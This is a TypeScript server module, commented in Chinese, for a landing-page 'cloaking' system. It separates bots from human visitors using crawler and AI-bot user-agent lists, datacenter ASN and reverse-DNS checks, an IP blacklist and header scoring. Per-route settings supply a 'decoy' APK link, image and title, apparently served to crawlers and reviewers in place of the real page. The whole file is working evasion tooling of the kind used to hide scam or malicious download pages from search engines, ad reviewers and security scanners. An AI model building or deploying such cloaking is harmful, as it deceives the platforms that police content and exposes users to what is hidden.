import dns, { Resolver } from "node:dns/promises";
import { getDb, getSetting, LandingRoute } from "./db";
import { getClientIp } from "./visit";
import { normalizeUploadImagePath } from "./uploads";
import { compareIpValue, ipMatchesCidr, parseIp } from "./ip";

// ── 已知爬虫/脚本 UA 关键词（移植自 cloak-router/detect.go）──────────────
const KNOWN_BOTS = [
  "googlebot", "bingbot", "baiduspider", "yandexbot", "duckduckbot",
  "gptbot", "oai-searchbot", "chatgpt-user", "claudebot", "claude-web",
  "anthropic-ai", "ccbot", "perplexitybot", "google-extended",
  "bytespider", "amazonbot", "applebot", "facebookexternalhit",
  "crawler", "spider", "bot/", "python-requests", "curl/", "wget/",
  "scrapy", "go-http-client", "java/", "okhttp", "node-fetch",
  "axios", "libwww", "httpclient", "headlesschrome", "phantomjs",
];

// ── 机房 ASN 机构名特征（移植自 cloak-router/asn.go）────────────────────
const DATACENTER_HINTS = [
  "amazon", "aws", "google", "gcp", "microsoft", "azure", "cloudflare",
  "alibaba", "aliyun", "tencent", "huawei", "digitalocean", "linode",
  "ovh", "hetzner", "vultr", "leaseweb", "scaleway", "contabo",
  "oracle", "ibm cloud", "softlayer", "choopa", "datacamp", "kamatera",
  "hosting", "host", "server", "colo", "cloud", "vps", "data center",
  "datacenter", "gigabit", "ucloud", "kingsoft", "baidu", "dmit",
];

// ── PTR 机房域名特征（移植自 cloak-router/ptr.go）───────────────────────
const PTR_DC_HINTS = [
  "amazonaws.com", "compute.amazonaws", "googleusercontent.com",
  "1e100.net", "azure", "cloudapp.net", "aliyun", "alibaba", "myqcloud.com",
  "tencent", "digitalocean.com", "linode.com", "vultr.com", "ovh.net",
  "hetzner.de", "leaseweb", "scaleway", "contabo.net", "oraclecloud.com",
  "hosting", "server", "static", "colo", "datacenter", "dmit",
];

const PTR_VERIFIED_BOT_DOMAINS = [
  "googlebot.com", "google.com", "search.msn.com", "crawl.baidu.com",
  "applebot.apple.com", "duckduckgo.com",
];

// ── ASN 判断：同时支持 ip2asn-v4.tsv / ip2asn-v6.tsv ───────────────────
interface AsnTable {
  start: bigint[];
  end: bigint[];
  org: string[];
}

let _asnLoaded = false;
let _asn4: AsnTable | null = null;
let _asn6: AsnTable | null = null;

export function loadAsnForCloak() {
  if (_asnLoaded) return;
  _asnLoaded = true;
  try {
    const fs = require("node:fs") as typeof import("node:fs");
    const path = require("node:path") as typeof import("node:path");
    const dir = process.env.GEODATA_DIR || path.join(process.cwd(), "geodata");
    _asn4 = loadAsnFile(path.join(dir, "ip2asn-v4.tsv"), 4);
    _asn6 = loadAsnFile(path.join(dir, "ip2asn-v6.tsv"), 6);
  } catch { /* 库缺失时降级 */ }
}

function loadAsnFile(file: string, version: 4 | 6): AsnTable | null {
  const fs = require("node:fs") as typeof import("node:fs");
  if (!fs.existsSync(file)) return null;
  const table: AsnTable = { start: [], end: [], org: [] };
  const lines = fs.readFileSync(file, "utf8").split("\n");
  for (const line of lines) {
    if (!line) continue;
    const c = line.split("\t");
    if (c.length < 5) continue;
    const start = parseIp(c[0]);
    const end = parseIp(c[1]);
    if (!start || !end || start.version !== version || end.version !== version) continue;
    table.start.push(start.value);
    table.end.push(end.value);
    table.org.push(c[4].toLowerCase());
  }
  return table.start.length > 0 ? table : null;
}

function isDatacenterIp(ip: string): boolean {
  loadAsnForCloak();
  const parsed = parseIp(ip);
  if (!parsed) return false;
  const table = parsed.version === 4 ? _asn4 : _asn6;
  if (!table) return false;
  let lo = 0, hi = table.start.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (compareIpValue(parsed.value, table.start[mid]) < 0) hi = mid - 1;
    else if (compareIpValue(parsed.value, table.end[mid]) > 0) lo = mid + 1;
    else {
      const org = table.org[mid];
      return DATACENTER_HINTS.some((h) => org.includes(h));
    }
  }
  return false;
}

// ── PTR 反查（内存 + 数据库缓存，TTL 6 小时）──────────────────────────────
interface PtrResult { isDc: boolean; isBot: boolean; host: string }

const PTR_CACHE_TTL_MS = 6 * 3600 * 1000;
const PTR_RESOLVERS = (process.env.PTR_RESOLVERS || "1.1.1.1,8.8.8.8")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);

const ptrMemoryCache = new Map<string, { result: PtrResult; expiresAt: number }>();
const ptrPending = new Map<string, Promise<PtrResult>>();

function getMemoryPtr(ip: string): PtrResult | null {
  const cached = ptrMemoryCache.get(ip);
  if (!cached) return null;
  if (cached.expiresAt > Date.now()) return cached.result;
  ptrMemoryCache.delete(ip);
  return null;
}

function setMemoryPtr(ip: string, result: PtrResult) {
  ptrMemoryCache.set(ip, { result, expiresAt: Date.now() + PTR_CACHE_TTL_MS });
}

async function reverseWithResolvers(ip: string): Promise<string[]> {
  const tasks: Promise<string[]>[] = [dns.reverse(ip)];
  for (const server of PTR_RESOLVERS) {
    const resolver = new Resolver();
    resolver.setServers([server]);
    tasks.push(resolver.reverse(ip));
  }
  return firstSuccessful(tasks);
}

async function firstSuccessful<T>(tasks: Promise<T>[]): Promise<T> {
  return new Promise((resolve, reject) => {
    let rejected = 0;
    let lastError: unknown = null;
    for (const task of tasks) {
      task.then(resolve).catch((err) => {
        rejected += 1;
        lastError = err;
        if (rejected === tasks.length) reject(lastError);
      });
    }
  });
}

async function lookupPtr(ip: string): Promise<PtrResult> {
  if (!ip) return { isDc: false, isBot: false, host: "" };

  const memory = getMemoryPtr(ip);
  if (memory) return memory;

  const pending = ptrPending.get(ip);
  if (pending) return pending;

  const task = lookupPtrFresh(ip).finally(() => {
    ptrPending.delete(ip);
  });
  ptrPending.set(ip, task);
  return task;
}

async function lookupPtrFresh(ip: string): Promise<PtrResult> {
  const db = getDb();
  const cached = db.prepare(
    "SELECT is_dc, is_bot, host, cached_at FROM ptr_cache WHERE ip = ?"
  ).get(ip) as { is_dc: number; is_bot: number; host: string; cached_at: string } | undefined;

  if (cached) {
    const age = Date.now() - new Date(cached.cached_at).getTime();
    if (age < PTR_CACHE_TTL_MS) {
      const result = { isDc: !!cached.is_dc, isBot: !!cached.is_bot, host: cached.host };
      setMemoryPtr(ip, result);
      return result;
    }
  }

  let result: PtrResult = { isDc: false, isBot: false, host: "" };
  try {
    const names = await reverseWithResolvers(ip);
    if (names.length > 0) {
      const host = names[0].toLowerCase().replace(/\.$/, "");
      result.host = host;
      result.isDc = PTR_DC_HINTS.some((h) => host.includes(h));
      if (!result.isDc) {
        const isVerifiedBot = PTR_VERIFIED_BOT_DOMAINS.some(
          (d) => host === d || host.endsWith("." + d)
        );
        if (isVerifiedBot) {
          // 正向校验防伪造
          try {
            const addrs = await dns.lookup(host);
            if (addrs.address === ip) result.isBot = true;
          } catch { /* 校验失败不判 bot */ }
        }
      }
    }
  } catch { /* 无 PTR 记录属正常，住宅 IP 常见 */ }

  db.prepare(
    `INSERT INTO ptr_cache (ip, is_dc, is_bot, host, cached_at)
     VALUES (?, ?, ?, ?, datetime('now','localtime'))
     ON CONFLICT(ip) DO UPDATE SET is_dc=excluded.is_dc, is_bot=excluded.is_bot,
       host=excluded.host, cached_at=excluded.cached_at`
  ).run(ip, result.isDc ? 1 : 0, result.isBot ? 1 : 0, result.host);

  setMemoryPtr(ip, result);
  return result;
}

// ── 请求头特征评分（移植自 cloak-router/detect.go headerScore）──────────
export function headerScore(headers: Headers): number {
  let score = 0;
  if (headers.get("sec-fetch-mode") === "navigate") score += 3;
  if (headers.get("sec-fetch-dest") === "document") score += 2;
  if (headers.get("sec-fetch-site")) score += 1;
  if (headers.get("sec-fetch-user") === "?1") score += 2;
  if (headers.get("sec-ch-ua")) score += 2;
  if (headers.get("upgrade-insecure-requests") === "1") score += 2;
  if (headers.get("accept-language")) score += 2;
  if (headers.get("accept")?.includes("text/html")) score += 2;
  if (headers.get("accept-encoding")?.includes("gzip")) score += 1;
  if (headers.get("user-agent")?.toLowerCase().includes("mozilla/5.0")) score += 1;
  return score;
}

// ── 服务端初判结果 ────────────────────────────────────────────────────────
export interface ServerVerdict {
  decision: "bot" | "unknown";
  reason: string;
  headerScore: number;
}

let ipBlacklistCache: string[] | null = null;
let cloakPrewarmStarted = false;

export function refreshIpBlacklistCache(): string[] {
  try {
    ipBlacklistCache = (getDb().prepare("SELECT cidr FROM ip_blacklist").all() as { cidr: string }[])
      .map((row) => row.cidr)
      .filter(Boolean);
  } catch {
    ipBlacklistCache = [];
  }
  return ipBlacklistCache;
}

// 检查 IP 是否命中黑名单（支持 IPv4 / IPv6 / CIDR）
export function isBlacklisted(ip: string): boolean {
  const cidrs = ipBlacklistCache ?? refreshIpBlacklistCache();
  return cidrs.some((cidr) => ipMatchesCidr(ip, cidr));
}

export function prewarmCloak() {
  if (cloakPrewarmStarted) return;
  cloakPrewarmStarted = true;
  setTimeout(() => {
    try {
      loadAsnForCloak();
      refreshIpBlacklistCache();
    } catch {
      // 预热失败时后续请求仍会按需加载。
      cloakPrewarmStarted = false;
    }
  }, 0);
}

// classifyServer：同步硬拦截（UA + ASN + IP黑名单），不等待 PTR。
export function classifyServerSync(headers: Headers): ServerVerdict {
  const ua = (headers.get("user-agent") || "").toLowerCase();

  if (!ua) {
    return { decision: "bot", reason: "空 User-Agent", headerScore: 0 };
  }
  for (const b of KNOWN_BOTS) {
    if (ua.includes(b)) {
      return { decision: "bot", reason: "已知爬虫/脚本 UA: " + b, headerScore: 0 };
    }
  }

  // 静态 GET 请求强制拦截:真实浏览器导航必有 sec-fetch-mode
  // 现代浏览器(Chrome 76+, Edge 79+, Firefox 90+)的所有导航请求都会自动带此头
  // 缺失 = curl/wget/python-requests 等静态抓取工具
  const secFetchMode = headers.get("sec-fetch-mode");
  if (!secFetchMode) {
    return { decision: "bot", reason: "缺少 sec-fetch-mode(静态抓取/旧浏览器)", headerScore: 0 };
  }

  const ip = getClientIp(headers);

  if (isBlacklisted(ip)) {
    return { decision: "bot", reason: "IP 黑名单: " + ip, headerScore: 0 };
  }

  if (isDatacenterIp(ip)) {
    return { decision: "bot", reason: "机房 ASN", headerScore: 0 };
  }

  return { decision: "unknown", reason: "需 JS 探针确认", headerScore: headerScore(headers) };
}

// classifyServerAsync：完整服务端判断，包含 PTR 反查。
export async function classifyServerAsync(headers: Headers): Promise<ServerVerdict> {
  const sync = classifyServerSync(headers);
  if (sync.decision === "bot") return sync;

  const ip = getClientIp(headers);
  const ptr = await lookupPtr(ip);
  if (ptr.isBot) {
    return { decision: "bot", reason: "已验证正规爬虫 PTR: " + ptr.host, headerScore: 0 };
  }
  if (ptr.isDc) {
    return { decision: "bot", reason: "机房 PTR: " + ptr.host, headerScore: 0 };
  }

  return sync;
}

// ── 分流总开关 & 配置读取 ─────────────────────────────────────────────────
export function isCloakEnabled(): boolean {
  return getSetting("cloak_enabled") === "1";
}

export function getCloakThreshold(): number {
  return parseInt(getSetting("cloak_threshold") || "8", 10);
}

export function getCloakTokenHours(): number {
  return parseInt(getSetting("cloak_token_hours") || "6", 10);
}

export function getDecoyConfig() {
  return {
    apkUrl: getSetting("cloak_decoy_apk_url") || "",
    imageUrl: normalizeUploadImagePath(getSetting("cloak_decoy_image_url")),
    title: getSetting("cloak_decoy_title") || "下载",
  };
}

export function routeCloakEnabled(route: LandingRoute): boolean {
  return route.cloak_enabled === 1;
}

export function routeCloakThreshold(route: LandingRoute): number {
  return Number(route.cloak_threshold || 8);
}

export function routeCloakTokenHours(route: LandingRoute): number {
  return Number(route.cloak_token_hours || 6);
}

export function routeDecoyConfig(route: LandingRoute) {
  return {
    apkUrl: route.cloak_decoy_apk_url || "",
    imageUrl: normalizeUploadImagePath(route.cloak_decoy_image_path),
    title: route.cloak_decoy_title || "下载",
  };
}
